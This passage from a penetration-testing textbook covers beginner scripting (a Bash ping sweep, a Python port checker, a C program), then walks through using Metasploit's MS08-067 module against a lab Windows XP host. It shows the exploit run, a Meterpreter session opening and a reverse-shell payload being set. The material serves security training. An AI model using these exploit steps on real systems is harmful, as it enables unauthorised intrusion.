IP version 4 address) and run the ping command against each of these 
possibilities. 
An ideal way to run through sequential possibilities is with a for loop v. 
Our for loop, for x in `seq 1 254`; do, tells the script to run the code that 
follows for each number from 1 to 254. This will allow us to run one set of 
instructions 254 times rather than writing out code for each instance. We 
denote the end of a for loop with the instruction done w. 
Programming 79
Inside the for loop, we want to ping each of the IP addresses in the network. Using ping‚Äôs man page, we find that the -c option will allow us to limit 
the number of times we ping a host. We set -c to 1 so that each host will be 
pinged just once. 
To specify which host to ping, we want to concatenate the first command 
line argument (which denotes the first three octets) with the current iteration of the for loop. The full command to use is ping -c 1 $1.$x. Recall 
that the $1 denotes the first command line argument, and $x is the current iteration of the for loop. The first time our for loop runs, it will ping 
192.168.20.1, then 192.168.20.2, all the way to 192.168.20.254. After iteration 254, our for loop finishes. 
When we run our script with the first three octets of our IP address as 
the command line argument, the script pings each IP address in the network as shown in Listing 3-4. 
root@kali:~/# ./pingscript.sh 192.168.20
PING 192.168.20.1 (192.168.20.1) 56(84) bytes of data.
64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=8.31 ms u
--- 192.168.20.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 8.317/8.317/8.317/0.000 ms
PING 192.168.20.2(192.168.20.2) 56(84) bytes of data.
64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=166 ms
--- 192.168.20.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 166.869/166.869/166.869/0.000 ms
PING 192.168.20.3 (192.168.20.3) 56(84) bytes of data.
From 192.168.20.13 icmp_seq=1 Destination Host Unreachable v
--- 192.168.20.3 ping statistics ---
1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms
--snip--
Listing 3-4: Running the ping sweep script 
Your results will vary based on the systems in your local network. Based 
on this output, I can tell that in my network, the host 192.168.20.1 is up, and 
I received an ICMP reply u. On the other hand, the host 192.168.20.3 is not 
up, so I received a host unreachable notification v. 
Streamlining the Results
All this information printed to screen is not very nice to look at, and anyone 
who uses our script will need to sift through a lot of information to determine which hosts in the network are up. Let‚Äôs add some additional functionality to streamline our results. 
80 Chapter 3
In the previous chapter we covered grep, which searches for and 
matches specific patterns. Let‚Äôs use grep to filter the script‚Äôs output, as 
shown in Listing 3-5.
#!/bin/bash
if [ "$1" == "" ]
then
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
else
for x in `seq 1 254`; do
ping -c 1 $1.$x | grep "64 bytes" u
done
fi
Listing 3-5: Using grep to filter results 
Here we look for all instances of the string 64 bytes u, which occurs 
when an ICMP reply is received when pinging a host. If we run the script 
with this change, we see that only lines that include the text 64 bytes are 
printed to the screen, as shown here.
root@kali:~/# ./pingscript.sh 192.168.20
64 bytes from 192.168.20.1: icmp_req=1 ttl=255 time=4.86 ms
64 bytes from 192.168.20.2: icmp_req=1 ttl=128 time=68.4 ms
64 bytes from 192.168.20.8: icmp_req=1 ttl=64 time=43.1 ms
--snip--
We get indicators only for live hosts; hosts that do not answer are not 
printed to the screen. 
But we can make this script even nicer to work with. The point of our 
ping sweep is to get a list of live hosts. By using the cut command discussed 
in Chapter 2, we can print the IP addresses of only the live hosts, as shown in 
Listing 3-6. 
#!/bin/bash
if [ "$1" == "" ]
then
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
else
for x in `seq 1 254`; do
ping -c 1 $1.$x | grep "64 bytes" | cut -d" " -f4 u
done
fi
Listing 3-6: Using cut to further filter results 
We can use a space as the delimiter and grab the fourth field, our IP 
address, as shown at u.
Programming 81
Now we run the script again as shown here.
root@kali:~/mydirectory# ./pingscript.sh 192.168.20
192.168.20.1:
192.168.20.2:
192.168.20.8:
--snip--
Unfortunately, we see a trailing colon at the end of each line. The results 
would be clear enough to a user, but if we want to use these results as input 
for any other programs, we need to delete the trailing colon. In this case, 
sed is the answer.
The sed command that will delete the final character from each line is 
sed 's/.$//', as shown in Listing 3-7. 
#!/bin/bash
if [ "$1" == "" ]
then
echo "Usage: ./pingscript.sh [network]"
echo "example: ./pingscript.sh 192.168.20"
else
for x in `seq 1 254`; do
ping -c 1 $1.$x | grep "64 bytes" | cut -d" " -f4 | sed 's/.$//'
done
fi
Listing 3-7: Using sed to drop the trailing colon 
Now when we run the script, everything looks perfect, as shown here.
root@kali:~/# ./pingscript.sh 192.168.20
192.168.20.1
192.168.20.2 
192.168.20.8
--snip--
NOTE Of course, if we want to output the results to a file instead of to the screen, we can 
the >> operator, covered in Chapter 2, to append each live IP address to a file. Try 
automating other tasks in Linux to practice your Bash scripting skills.
Python Scriptin
Linux systems typically come with interpreters for other scripting languages 
such as Python and Perl. Interpreters for both languages are included in 
Kali Linux. In Chapters 16 through 19, we‚Äôll use Python to write our own 
exploit code. For now, let‚Äôs write a simple Python script and run it in Kali 
Linux just to demonstrate the basics of Python scripting.
82 Chapter 3
For this example we‚Äôll do something similar to our first Netcat example 
in Chapter 2: We‚Äôll attach to a port on a system and see if the port is listening. A starting point for our script is shown here.
#!/usr/bin/python u
ip = raw_input("Enter the ip: ") v
port = input("Enter the port: ") w
In the previous section, the first line of our script told the terminal to 
use Bash to interpret the script. We do the same thing here, pointing to the 
Python interpreter installed on Kali Linux at /usr/bin/python u. 
We‚Äôll begin by prompting the user for data and recording input into 
variables. The variables will store the input for use later in the script. To 
take input from the user, we can use the Python function raw_input v. We 
want to save our port as an integer, so we use a similar built-in Python function, input, at w. Now we ask the user to input an IP address and a port to test. 
After saving the file, use chmod to make the script executable before running the script, as shown here. 
root@kali:~/mydirectory# chmod 744 pythonscript.py
root@kali:~/mydirectory# ./pythonscript.py
Enter the ip: 192.168.20.10 
Enter the port: 80
When you run the script, you‚Äôre prompted for an IP address and a port, 
as expected. 
Now we will add in some functionality to allow us to use the user‚Äôs input 
to connect to the chosen system on the selected port to see if it is open 
(Listing 3-8).
#!/usr/bin/python
import socket u
ip = raw_input("Enter the ip: ")
port = input("Enter the port: ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) v
if s.connect_ex((ip, port)): w
 print "Port", port, "is closed" x
else: y
 print "Port", port, "is open"
Listing 3-8: Adding port-scanning functionality 
To perform networking tasks in Python, we can include a library called 
socket using the command import socket u. The socket library does the heavy 
lifting for setting up a network socket. 
The syntax for creating a TCP network socket is socket.socket(socket.AF_
INET, socket.SOCK_STREAM). We set a variable equal to this network socket at v. 
Programming 83
Connecting to a Port
When creating a socket to connect to a remote port, the first candidate 
available from Python is the socket function connect. However, there is 
a better candidate for our purposes in the similar function, connect_ex. 
According to the Python documentation, connect_ex is like connect except 
that it returns an error code instead of raising an exception if the connection fails. If the connection succeeds, connect_ex will return the value 0. 
Because we want to know whether the function can connect to the port, 
this return value seems ideal to feed into an if statement. 
if Statements in Python
When building if statements in Python, we enter if condition:. In Python the 
statements that are part of a conditional or loop are denoted with indentations rather than ending markers, as we saw in Bash scripting. We can 
instruct our if statement to evaluate the returned value of the connection 
of our TCP socket to the user-defined IP address and port with the command if s.connect_ex((ip, port)): w. If the connection succeeds, connect_ex
will return 0, which will be evaluated by the if statement as false. If the connection fails, connect_ex will return a positive integer, or true. Thus, if our if
statement evaluates as true, it stands to reason that the port is closed, and 
we can present this to the user using the Python print command at x. And, 
as in the Bash scripting example, if connect_ex returns 0 at y, we can use an 
else statement (the syntax is else: in Python) to instead inform the user 
that the tested port is open. 
Now, run the updated script to test whether TCP port 80 is running on 
the Windows XP target host as shown here. 
root@kali:~/# ./pythonscript.py
Enter the ip: 192.168.20.10 
Enter the port: 80
Port 80 is open
According to our script, port 80 is open. Now run the script again 
against port 81. 
root@kali:~/# ./pythonscript.py 
Enter the ip: 192.168.20.10
Enter the port: 81
Port 81 is closed
This time, the script reports that port 81 is closed. 
NOTE We will look at checking open ports in Chapter 5, and we will return to Python scripting when we study exploit development. Kali Linux also has interpreters for the P
and Ruby languages. We will learn a little bit of Ruby in Chapter 19. It never hurts 
to know a little bit of multiple languages. If you are up for a challenge, see if you can 
re-create this script in Perl and Ruby.
84 Chapter 3
Writing and Compiling C Programs
Time for one more simple programming example, this time in the C programming language. Unlike scripting languages such as Bash and Python, 
C code must be compiled and translated into machine language that the 
CPU can understand before it is run. 
Kali Linux includes the GNU Compiler Collection (GCC), which will 
allow us to compile C code to run on the system. Let‚Äôs create a simple C program that says hello to a command line argument, as shown in Listing 3-9.
#include <stdio.h> u
int main(int argc, char *argv[]) v
{
 if(argc < 2) w
 {
 printf("%s\n", "Pass your name as an argument"); x
 return 0; y
 }
 else
 {
 printf("Hello %s\n", argv[1]); z
 return 0;
 }
}
Listing 3-9: ‚ÄúHello World‚Äù C program 
The syntax for C is a bit different from that of Python and Bash. Because 
our code will be compiled, we don‚Äôt need to tell the terminal which interpreter to use at the beginning of our code. First, as with our Python example, 
we import a C library. In this case we‚Äôll import the stdio (short for standard 
input and output) library, which will allow us to accept input and print 
output to the terminal. In C, we import stdio with the command #include 
<stdio.h> u. 
Every C program has a function called main v that is run when the 
program starts. Our program will take a command line argument, so we 
pass an integer argc and a character array argv to main. argc is the argument 
count, and argv is the argument vector, which includes any command line 
arguments passed to the program. This is just standard syntax for C programs that accept command line arguments. (In C, the beginning and end 
of functions, loops, and so on are denoted by braces {}.) 
First, our program checks to see if a command line argument is present. The argc integer is the length of the argument array; if it is less than 
two (the program name itself and the command line argument), then a 
command line argument has not been given. We can use an if statement 
to check w. 
The syntax for if is also a little different in C. As with our Bash script, if 
a command line argument is not given, we can prompt the user with usage 
information x. The printf function allows us to write output to the terminal. Also note that statements in C are finished with a semicolon (;). Once 
Programming 85
we‚Äôre through with our program, we use a return statement y to finish the 
function main. If a command line argument is supplied, our else statement 
instructs the program to say hello z. (Be sure to use braces to close all of 
your loops and the main function.)
Before we can run our program, we need to compile it with GCC as 
shown here. Save the program as cprogram.c.
root@kali:~# gcc cprogram.c -o cprogram
Use the -o option to specify the name for the compiled program and 
feed your C code to GCC. Now run the program from your current directory. If the program is run with no arguments, you should see usage information as shown here.
root@kali:~# ./cprogram
Pass your name as an argument
If instead we pass it an argument, in this case our name, the program 
tells us hello. 
root@kali:~# ./cprogram georgia
Hello georgia
NOTE We will look at another C programming example in Chapter 16, where a little bit
sloppy C coding leads to a buffer overflow condition, which we will exploit.
Summar
In this chapter we‚Äôve looked at simple programs in three different languages. 
We looked at basic constructs, such as saving information in variables for 
later use. Additionally, we learned how to use conditionals, such as if statements, and iterations, such as for loops, to have the program make decisions 
based on the provided information. Though the syntax used varies from programming language to programming language, the ideas are the same. 

4
Using th 
M etasploi F rame w
In subsequent chapters, we‚Äôll take an in-depth look at 
the phases of penetration testing, but in this chapter, 
we‚Äôll dive right in and get some hands-on experience 
with exploitation. Though the information-gathering 
and reconnaissance phases often have more bearing on a pentest‚Äôs success than exploitation does, it‚Äôs 
more fun to gather shells (a remote connection to 
an exploited target) or trick users into entering their 
company credentials into your cloned website. 
In this chapter we‚Äôll work with the Metasploit Framework, a tool that 
has become the de facto standard for penetration testers. First released in 
2003, Metasploit has reached cult status in the security community. Though 
Metasploit is now owned by the security company Rapid7, an open source 
edition is still available, with development largely driven by the security 
community. 
88 Chapter 4
Metasploit‚Äôs modular and flexible architecture helps developers efficiently create working exploits as new vulnerabilities are discovered. As 
you‚Äôll see, Metasploit is intuitive and easy to use, and it offers a centralized 
way to run trusted exploit code that has been vetted for accuracy by the 
security community. 
Why use Metasploit? Say you‚Äôve discovered a vulnerability in your client 
environment‚Äîthe Windows XP system at 192.168.20.10 is missing Microsoft 
security bulletin MS08-067. As a penetration tester, it is up to you to exploit 
this vulnerability, if possible, and assess the risk of a compromise. 
One approach might be to set up in your lab a Windows XP system that 
is also missing this patch, attempt to trigger the vulnerability, and develop a 
working exploit. But developing exploits by hand takes both time and skill, 
and the window of opportunity for your pentest may be closing. 
You could instead search for code that exploits this vulnerability on 
the Internet. Sites like Packet Storm Security (http://www.packetstormsecurity
.com/), SecurityFocus (http://www.securityfocus.com/), and Exploit Database 
(http://www.exploit-db.com/) provide repositories of known exploit code. 
But be forewarned: Not all public exploit code does what it claims to do. 
Some exploit code may destroy the target system or even attack your system 
instead of the target. You should always be vigilant when running anything 
you find online and read through the code carefully before trusting it. Additionally, the public exploits you find may not meet your needs right out of 
the box. You may need to do some additional work to port them to your 
pentest environment. 
Whether we develop an exploit from scratch or use a public one as a 
base, we will still need to get that exploit to work on your pentest. Our time 
will probably be better spent on tasks that are difficult to automate, and 
luckily, we can use Metasploit to make exploiting known vulnerabilities 
such as MS08-067 quick and painless. 
Starting Metasplo
Let‚Äôs start Metasploit and attack our first system. In Kali Linux, Metasploit 
is in our path, so we can start it anywhere on the system. But before you 
start Metasploit, you will want to start the PostgreSQL database, which 
Metasploit will use to track what you do. 
root@kali:~# service postgresql start
Now you‚Äôre ready to start the Metasploit service. This command creates 
a PostgreSQL user called msf3 and a corresponding database to store our 
data. It also starts Metasploit‚Äôs remote procedure call (RPC) server and web 
server.
root@kali:~# service metasploit start
Using the Metasploit Framework 89
There are multiple interfaces for using Metasploit. In this chapter 
we‚Äôll use Msfconsole, the Metasploit text-based console, and Msfcli, the 
command line interface. Either interface can be used to run Metasploit 
modules, though I tend to spend most of my time in Msfconsole. Start the 
console by entering msfconsole. 
root@kali:~# msfconsole
Don‚Äôt be alarmed if Msfconsole appears to hang for a minute or two; 
it‚Äôs loading the Metasploit module tree on the fly. Once it‚Äôs finished, you‚Äôll 
be greeted by some clever ASCII art, a version listing and other details, and 
an msf > prompt (see Listing 4-1).
 , ,
 / \
 ((__---,,,---__))
 (_) O O (_)_________
 \ _ / |\
 o_o \ M S F | \
 \ _____ | *
 ||| WW|||
 ||| |||
Large pentest? List, sort, group, tag and search your hosts and services
in Metasploit Pro -- type 'go_pro' to launch it now.
 =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
msf >
Listing 4-1: Starting Msfconsole 
Notice in Listing 4-1 that, as of this writing, Metasploit had 1,246 exploits, 
678 auxiliary modules, and so forth. No doubt by the time you read this, 
these numbers will be even larger. New modules are always being added to 
Metasploit, and because Metasploit is a community-driven project, anyone 
can submit modules for inclusion in the Metasploit Framework. (In fact, in 
Chapter 19, you‚Äôll learn how to write your own modules and gain immortality as a Metasploit author.)
If you‚Äôre ever stuck when using Msfconsole, enter help for a list of available commands and a description of what they do. For more detailed information about a specific command, including usage, enter help <command name>.
For example, the help information for using Metasploit‚Äôs route command is shown in Listing 4-2.
90 Chapter 4
msf > help route
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]
Route traffic destined to a given subnet through a supplied session.
The default comm is Local...
Listing 4-2: Help information in Metasploit 
Finding Metasploit Modul
Let‚Äôs look at how we might use Metasploit to exploit an unpatched vulnerability in our Windows XP target. We will exploit the vulnerability patched 
in Microsoft Security Bulletin MS08-067. A natural question you may have 
is, how do we know this patch is missing on our Windows XP target? In 
subsequent chapters, we will walk through the steps of discovering this vulnerability as well as several others on our target systems. For now, just trust 
me that this is the vulnerability we would like to exploit. 
MS08-067 patched an issue in the netapi32.dll that could allow attackers to use a specially crafted remote procedure call request via the Server 
Message Block (SMB) service to take over a target system. This vulnerability 
is particularly dangerous because it does not require an attacker to authenticate to the target machine before running the attack. MS08-067 gained 
eternal infamy as the vulnerability exploited by the Conficker worm, which 
was widely reported in the media.
Now, if you‚Äôre familiar with Microsoft patches, you may recognize that 
this one is from 2008. Considering its age, you may be surprised to learn 
how often the vulnerability it patched can still lead to success in penetration testing, even today, particularly when assessing internal networks. 
Metasploit‚Äôs MS08-067 module is simple to use and has a high success rate, 
making it an ideal first example. Our first step in using Metasploit is to find 
a module that exploits this particular vulnerability. We have a few options. 
Usually, a simple Google search will find what you need, but Metasploit 
also has an online database of modules (http://www.rapid7.com/db/modules/) 
and a built-in search function that you can use to search for the correct 
modules. 
The Module Database
You can use the Metasploit search page to match Metasploit modules to 
vulnerabilities by Common Vulnerabilities and Exposures (CVE) number, Open Sourced Vulnerability Database (OSVDB) ID, Bugtraq ID, or 
Microsoft Security Bulletin, or you can search the full text of the module 
information for a string. Search for MS08-067 in the Microsoft Security 
Bulletin ID field, as shown in Figure 4-1.
Using the Metasploit Framework 91
Figure 4-1: Searching the Metasploit Auxiliary Module & Exploit Database 
The results of the search, shown in Figure 4-2, tell us the module name 
we need as well as information about the module (which we‚Äôll discuss in the 
next section).
Figure 4-2: MS08-067 Metasploit module page 
The full name of the Metasploit module for the MS08-067 security 
bulletin is shown in the URI bar. In the modules directory of Metasploit, 
this exploit is exploit/windows/smb/ms08_067_netapi. 
Built-In Search
You can also use Metasploit‚Äôs built-in search function to find the correct 
module name, as shown in Listing 4-3. 
92 Chapter 4
msf > search ms08-067
Matching Modules
================
 Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
 exploit/windows/smb/ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server 
 Service Relative Path 
 Stack Corruption
Listing 4-3: Searching for a Metasploit module 
Again we find that the correct module name for this vulnerability 
is exploit/windows/smb/ms08_067_netapi. Once you‚Äôve identified a module to use, enter the info command with the module name, as shown in 
Listing 4-4.
msf > info exploit/windows/smb/ms08_067_netapi
 uName: Microsoft Server Service Relative Path Stack Corruption
 vModule: exploit/windows/smb/ms08_067_netapi
 Version: 0
 wPlatform: Windows
xPrivileged: Yes
 License: Metasploit Framework License (BSD)
 yRank: Great
z Available targets:
 Id Name
 -- ----
 0 Automatic Targeting
 1 Windows 2000 Universal
 2 Windows XP SP0/SP1 Universal
 --snip--
 67 Windows 2003 SP2 Spanish (NX)
{ Basic options:
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST yes The target address
 RPORT 445 yes Set the SMB service port
 SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
| Payload information:
 Space: 400
 Avoid: 8 characters
} Description:
 This module exploits a parsing flaw in the path canonicalization 
 code of NetAPI32.dll through the Server Service. This module is 
 capable of bypassing NX on some operating systems and service packs. 
 The correct target must be used to prevent the Server Service (along 
 with a dozen others in the same process) from crashing. Windows XP 
Using the Metasploit Framework 93
 targets seem to handle multiple successful exploitation events, but 
 2003 targets will often crash or hang on subsequent attempts. This 
 is just the first version of this module, full support for NX bypass 
 on 2003, along with other platforms, is still in development.
~ References:
 http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx 
Listing 4-4: Information listing in Metasploit 
This info page tells us a lot. 
‚Ä¢	 First we see some basic information about the module, including a 
descriptive name at u followed by the module name at v. (The version 
field formerly denoted the SVN revision for the module, but now that 
Metasploit is hosted on GitHub, all modules are set to version 0.) 
‚Ä¢	 Platform w tells us that this exploit is for Windows systems. 
‚Ä¢	 Privileged x tells us whether this module requires or grants high privileges on the target. The License is set to Metasploit Framework License 
(BSD). (Metasploit‚Äôs license is a three-clause BSD open source license.) 
‚Ä¢	 Rank y lists the exploit‚Äôs potential impact on the target. Exploits are 
ranked from manual to excellent. An exploit ranked excellent should 
never crash a service; memory-corruption vulnerabilities such as 
MS08-067 are usually not in this category. Our module is in the great 
category, one step down. A great exploit can automatically detect 
the correct target and has other features that make it more likely to 
succeed.
‚Ä¢	 Available targets z lists operating system versions and patch levels that 
the module can exploit. This module has 67 possible targets, including 
Windows 2000, Windows 2003, and Windows XP, as well as multiple service and language packs. 
‚Ä¢	 Basic options { lists various options for the module that can be set to 
make a module better meet our needs. For example, the RHOST option 
tells Metasploit the IP address of the target. (We‚Äôll discuss the basic 
options in depth in ‚ÄúSetting Module Options‚Äù on page 94.) 
‚Ä¢	 Payload information | contains information to help Metasploit decide 
which payloads it can use with this exploit. Payloads, or shellcode, tell 
the exploited system what to do on behalf of the attacker. (The goal of 
attacking a target is, of course, to get it to do something on our behalf 
that it isn‚Äôt supposed to do.) Metasploit‚Äôs payload system gives us many 
options for what to make the target do. 
‚Ä¢	 Description } includes more details about the particular vulnerability 
that the module exploits.
‚Ä¢	 References ~ contains a link to online vulnerability database entries. If 
you‚Äôre ever in doubt about which Metasploit module to use for a vulnerability, start with its info page. 
94 Chapter 4
Having confirmed that this is the right module, tell Metasploit to use 
this module with the command use windows/smb/ms08_067_netapi. You can 
drop the exploit/ part of the exploit name; Metasploit will figure out what 
you want. 
msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > 
Now we‚Äôre in the context of the exploit module. 
Setting Module Optio
Having chosen our exploit, we need to give Metasploit some information. As you‚Äôll see throughout this book, Metasploit can aid you in many 
aspects of penetration testing, but it isn‚Äôt a mind reader . . . yet. To see the 
information Metasploit needs from you to run your chosen module, enter 
show options (Listing 4-5). 
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 uRHOST yes The target address
 vRPORT 445 yes Set the SMB service port
 wSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC) 
Exploit target:
 Id Name
 -- ----
 x0 Automatic Targeting
msf exploit(ms08_067_netapi) > 
Listing 4-5: Exploit module options 
At the top of the output shown in Listing 4-5 are the module settings 
and any default values, whether certain settings are required for the module to run successfully, and a description of each setting. 
RHOST
The RHOST option u refers to the remote host we want to exploit. This 
option is required because it gives Metasploit a target to attack. We‚Äôll 
tell Metasploit to exploit the Windows XP target machine that we set up 
in Chapter 1 by changing the RHOST option from blank to our target IP 
address. (If you can‚Äôt remember what that is, on the Windows XP machine 
Using the Metasploit Framework 95
run ipconfig at the command line to find out.) To set an option enter set 
<option to set> <value to set it to>, so in this case, set RHOST 192.168.20.10. 
(Remember to use your own Windows XP target‚Äôs IP address.) After issuing 
this command, running show options again should show that the value of 
RHOST is set to 192.168.20.10. 
RPORT
RPORT v refers to the remote port to attack. I remember a former manager 
of mine who spent a good amount of time looking for port 80‚Äîas in trying to locate it physically. Unsatisfied with my explanation that networking 
sockets are made entirely of code, I eventually just pointed at the Ethernet 
port. The moral of this story is this: A port is just a network socket; it‚Äôs not a 
physical port. For example, when you browse to www.google.com, a web server 
somewhere on the Internet is listening on port 80. 
In this case we see that RPORT is set to a default value. Because our exploit 
uses the Windows SMB service, the RPORT value should probably be 445, the 
default port for SMB. And, as you can see, Metasploit saves us the trouble of 
having to set the value by setting the default to 445 (which you can change 
if you need to). In our case, we can just leave it alone.
SMBPIPE
Like the RPORT value, keep the default for the SMBPIPE option w as BROWSER. 
This will work just fine for our purposes. (SMB pipes allow us to talk to 
Windows interprocess communication over a network. We‚Äôll look at finding out which SMB pipes are listening on our target machines later in this 
chapter.)
Exploit Target
The Exploit Target is set to 0 Automatic Targeting x. This is the target operating system and version. You can view the available targets on the module‚Äôs 
info page or just show them with the command show targets (Listing 4-6).
msf exploit(ms08_067_netapi) > show targets
Exploit targets:
 Id Name
 -- ----
 0 Automatic Targeting
 1 Windows 2000 Universal
 2 Windows XP SP0/SP1 Universal
 3 Windows XP SP2 English (AlwaysOn NX)
 4 Windows XP SP2 English (NX)
 5 Windows XP SP3 English (AlwaysOn NX)
 --snip--
 67 Windows 2003 SP2 Spanish (NX)
Listing 4-6: Exploit targets 
96 Chapter 4
As you can see in Listing 4-6, this module can attack Windows 2000, 
Windows 2003, and Windows XP. 
N ote Remember, Microsoft has released patches for all the platforms affected by this bug,
but keeping all systems in an environment up-to-date with Windows patches is easier 
said than done. Many of your pentesting clients will be missing some critical updates 
in Windows and other software.
We know that our target is running Windows XP SP3 English, so we can 
wager that the correct target number is either 5 or 6, but it won‚Äôt always be 
so easy. Choose Automatic Targeting to tell Metasploit to fingerprint the SMB 
service and choose the appropriate target based on the results. 
To set a target option, enter set target <target number>. In this case we‚Äôll 
leave the module target at the default Automatic Targeting and move on. 
Payloads (or Shellcode
Based on the output of show options command, it looks like everything should 
be ready to go at this point, but we‚Äôre not quite done yet. We‚Äôve forgotten to 
tell our exploit what to do once the target has been exploited. One of the 
ways that Metasploit makes things easier is by setting up our payloads for us. 
Metasploit has a plethora of payloads, ranging from simple Windows commands to the extensible Metasploit Meterpreter (see Chapter 13 for more 
detailed information on Meterpreter). Just select a compatible payload, and 
Metasploit will craft your exploit string, including the code to trigger the 
vulnerability and the payload to run after exploitation is successful. (We‚Äôll 
look at writing exploits by hand in Chapters 16 through 19.)
Finding Compatible Payloads
As of this writing there were 324 payloads in Metasploit, and like exploit 
modules, new payloads are added to the Framework regularly. For instance, 
as mobile platforms take over the world, payloads for iOS and other smartphones are starting to show up in Metasploit. But, of course, not all 324 payloads are compatible with our chosen exploit. Our Windows system will be a 
bit confused if it receives instructions that are meant for an iPhone. To see 
compatible payloads, enter show payloads, as shown in Listing 4-7. 
msf exploit(ms08_067_netapi) > show payloads
Compatible Payloads
===================
 Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
 generic/custom normal Custom Payload
 generic/debug_trap normal Generic x86 Debug Trap
 generic/shell_bind_tcp normal Generic Command Shell, Bind TCP 
 Inline
Using the Metasploit Framework 97
 generic/shell_reverse_tcp normal Generic Command Shell, Reverse 
 Inline
 generic/tight_loop normal Generic x86 Tight Loop
 windows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind 
 TCP Stager (IPv6)
 windows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind 
 TCP Stager (No NX or Win7)
 windows/dllinject/bind_tcp normal Reflective DLL Injection, Bind 
 TCP Stager
 windows/dllinject/reverse_http normal Reflective DLL Injection, Reverse
 HTTP Stager
--snip--
 windows/vncinject/reverse_ipv6_http normal VNC Server (Reflective Injection),
 Reverse HTTP Stager (IPv6)
 windows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection), 
 Reverse TCP Stager (IPv6)
--snip--
 windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection), 
 Reverse TCP Stager
 windows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection), 
 Reverse All-Port TCP Stager
 windows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection), 
 Reverse TCP Stager (DNS)
Listing 4-7: Compatible payloads 
If you forget to set a payload, you may find that, miraculously, the exploit 
module will just choose the default payload and associated settings and run 
it anyway. Still, you should get in the habit of manually setting a payload and 
its options because the default won‚Äôt always fit your needs. 
A Test Run
Let‚Äôs keep things simple and send off our exploit with the default payload 
options first, just to see how things work. Enter exploit to tell Metasploit to 
run the module, as shown in Listing 4-8. 
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at 
2015-08-31 07:37:05 -0400
meterpreter > 
Listing 4-8: Running the exploit 
98 Chapter 4
As you can see, we end up with a Meterpreter session. Meterpreter is 
short for meta-interpreter, Metasploit‚Äôs unique payload. I often describe it as 
a shell on steroids. It can do everything a command shell can do and much, 
much more. We‚Äôll cover Meterpreter in depth in Chapter 13, but to get a 
head start, enter help in the Meterpreter console for a list of Meterpreter‚Äôs 
commands. 
N ote Another thing to note about the default options is that Metasploit uses the port 4444.
In our lab there is nothing wrong with this. It will work just fine. However, on real 
engagements, if your client is using even primitive intrusion-prevention software, it 
may take note of traffic on port 4444 and say, ‚ÄúHey, you are Metasploit, go away!‚Äù 
and drop your connection. 
For now, let‚Äôs close our Meterpreter session and learn more about selecting payloads manually. As useful as Meterpreter is, you may find yourself 
in situations where it is not the ideal payload to meet your needs. Type exit
into your Meterpreter prompt to return to the regular Metasploit console. 
meterpreter > exit
[*] Shutting down Meterpreter...
[*] Meterpreter session 1 closed. Reason: User exit
msf exploit(ms08_067_netapi) > 
Types of Shel
In the list of compatible payloads shown in Listing 4-7, you see a range of 
options including command shells, Meterpreter, a speech API, or execution 
of a single Windows command. Meterpreter or otherwise, shells fall into two 
categories: bind and reverse. 
Bind Shells
A bind shell instructs the target machine to open a command shell and listen 
on a local port. The attack machine then connects to the target machine on 
the listening port. However, with the advent of firewalls, the effectiveness 
of bind shells has fallen because any correctly configured firewall will block 
traffic to some random port like 4444. 
Reverse Shells
A reverse shell, on the other hand, actively pushes a connection back to the 
attack machine rather than waiting for an incoming connection. In this 
case, on our attack machine we open a local port and listen for a connection from our target because this reverse connection is more likely to make 
it through a firewall. 
Using the Metasploit Framework 99
N ote You may be thinking, ‚ÄúWas this book written in 2002 or something? My firewall has
egress filtering.‚Äù Modern firewalls allow you to stop outbound connections as well as 
inbound ones. It would be trivial to stop a host in your environment from connecting 
out, for instance, to port 4444. But say I set up my listener on port 80 or port 443. 
To a firewall, that will look like web traffic, and you know you have to let your users 
look at Facebook from their workstations or there would be mutiny and pandemonium 
on all sides. 
Setting a Payload Manual
Let‚Äôs select a Windows reverse shell for our payload. Set a payload the same 
way you set the RHOST option: set payload <payload to use>.
msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
Because this is a reverse shell, we need to tell the target where to 
send the shell; specifically, we need to give it the IP address of the attack 
machine and the port we will listen on. Running show options again, shown 
in Listing 4-9, displays the module as well as the payload options. 
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST 192.168.20.10 yes The target address
 RPORT 445 yes Set the SMB service port
 SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
Payload options (windows/shell_reverse_tcp):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC thread yes Exit technique: seh, thread, process, none
